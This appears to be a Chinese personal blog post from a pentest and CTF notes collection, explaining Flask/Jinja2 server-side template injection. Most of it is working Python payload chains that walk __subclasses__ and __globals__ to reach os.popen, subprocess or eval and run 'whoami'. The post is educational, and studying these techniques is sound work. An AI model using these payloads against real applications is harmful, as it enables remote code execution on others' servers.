---
draft: false
isCJKLanguage: true
date: 2021-07-11
lastmod: 2024-05-23
title: "Flask 模版注入（SSTI）"
description: 我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。
categories: 
  - Pentest
tags:
  - python
  - ctf
  - rce
---


### 0x00 SSTI 模版注入
SSTI 模版注入一般都是先找到执行命令的模块模块，然后执行（可以用工具 tplmap）

一般步骤：  
1、某种类型 (字符串:""，list:[]，int：1) 开始引出  
2、`__class__` 找到当前类  
3、`__mro__` 或者 `__base__` 或者 `__bases__` 找到根类 `__object__`  
4、然后利用 `__subclasses__` 拿到子类列表  
5、然后在子类列表 `__init__.__globals__.keys()` 找到类似 popen 能执行命令的函数


### 0x01 python3 例子
* 当前类
    ```py
    # __class__ 返回对象所属类
    >>> ''.__class__
    <class 'str'>
    ```

* 获取 object 根类
    ```py
    # __mro__、__bases__ 都可以返回继承链关系
    >>> ''.__class__.__mro__
    (<class 'str'>, <class 'object'>)
    >>> ''.__class__.__bases__
    (<class 'object'>,)
    ```

* 获取子类列表
    ```py
    # __subclasses__() 以列表返回类的所有子类
    >>> ''.__class__.__mro__[1].__subclasses__()
    [<type 'type'>,
    <type 'weakref'>,
    <type 'weakcallableproxy'>,
    <type 'super'>,
    <type 'dict'>,
    <type 'set'>,
    ......
    ......
    <class 'site._Printer'>,
    <class 'site._Helper'>,
    <class 'site.Quitter'>,
    <class 'codecs.IncrementalEncoder'>,
    <class 'codecs.IncrementalDecoder'>]
    ```

* 通过 os.popen、os.system、subprocess.Popen 执行命令
    
    找到存在 popen、system 等可以执行命令的类
    ```py
    >>> for i,v in enumerate(''.__class__.__bases__[0].__subclasses__()):
    ...     try:
    ...         if 'popen' in v.__init__.__globals__:
    ...             print(i, v)
    ...     except:
    ...         pass
    ...
    154 <class 'os._wrap_close'>
    
    >>> for i,v in enumerate(''.__class__.__bases__[0].__subclasses__()):
    ...     try:
    ...         if 'Popen' in v.__init__.__globals__:
    ...             print(i, v)
    ...     except:
    ...         pass
    ...
    250 <class 'subprocess.CompletedProcess'>
    251 <class 'subprocess.Popen'>
    ```

    通过 `__init__` 初始化类实例
    ```py
    >>> ''.__class__.__bases__[0].__subclasses__()[154].__init__
    <function _wrap_close.__init__ at 0x1081df740>
    ```
    
    通过 `__globals__` 拿到字典类型的内建模块，可以看到 popen
    ```py
    >>> ''.__class__.__mro__[2].__subclasses__()[74].__init__.__globals__
    {'__name__': 'os', 
    '__doc__': "OS routines for...", 
    '__package__': '', 
    '__doc__': "Built-in function....", 
    ......
    ......
    '__all__': [
        'spawnv', 
        'spawnve', 
        'spawnvp', 
        'spawnvpe', 
        'popen',
        ......
    ], 
    'fdopen': <function fdopen at 0x1081df6a0>, 
    '_fspath': <function _fspath at 0x1081dfb00>, 
    'PathLike': <class 'os.PathLike'>}
    ```
    
    初始化后执行命令
    ```py
    >>> ''.__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['popen']('whoami').read()
    'reber\n'
    ```

* 直接通过 os 模块执行命令
    
    其实上面的例子用的是 os 模块
    ```py
    >>> for i,v in enumerate(''.__class__.__bases__[0].__subclasses__()):
    ...     try:
    ...         if 'os' in v.__init__.__globals__:
    ...             print(i, v)
    ...     except:
    ...         pass
    ...
    158 <class '_distutils_hack._TrivialRe'>
    232 <class 'contextlib._GeneratorContextManagerBase'>
    233 <class 'contextlib._BaseExitStack'>
    239 <class 'inspect.BlockFinder'>
    242 <class 'inspect.Parameter'>
    243 <class 'inspect.BoundArguments'>
    244 <class 'inspect.Signature'>
    250 <class 'subprocess.CompletedProcess'>
    251 <class 'subprocess.Popen'>
    ```
    
    执行命令
    ```py
    >>> ''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['os'].popen('whoami').read()
    'reber\n'
    ```
    
    这种方法<f>不准确</f>，因为一些不相关的类名中也存在字符串 "os"

* 通过 `__builtins__` 执行命令
    
    `__builtins__` 下有 eval、`__import__` 等函数
    ```py
    >>> for i,v in enumerate(''.__class__.__bases__[0].__subclasses__()):
    ...     try:
    ...         if 'eval' in v.__init__.__globals__['__builtins__']:
    ...             print(i, v)
    ...     except:
    ...         pass
    ...
    140 <class 'codecs.IncrementalEncoder'>
    141 <class 'codecs.IncrementalDecoder'>
    142 <class 'codecs.StreamReaderWriter'>
    143 <class 'codecs.StreamRecoder'>
    154 <class 'os._wrap_close'>
    155 <class '_sitebuiltins.Quitter'>
    163 <class 'warnings.WarningMessage'>
    164 <class 'warnings.catch_warnings'>
    191 <class 'reprlib.Repr'>
    201 <class 'functools.partialmethod'>
    ```
    
    通过第 140 个的类执行命令
    ```py
    >>> ''.__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
    'reber\n'
    >>> ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()
    'reber\n'
    ```


**Reference(侵删)：**
* [Flask基础及模板注入漏洞（SSTI）](https://xz.aliyun.com/t/12163?_blank)
* [SSTI的payload](https://www.cnblogs.com/chrysanthemum/p/12766783.html?_blank)
* [Python 沙盒逃逸备忘](https://www.k0rz3n.com/2018/05/04/Python%20沙盒逃逸备忘/?_blank)
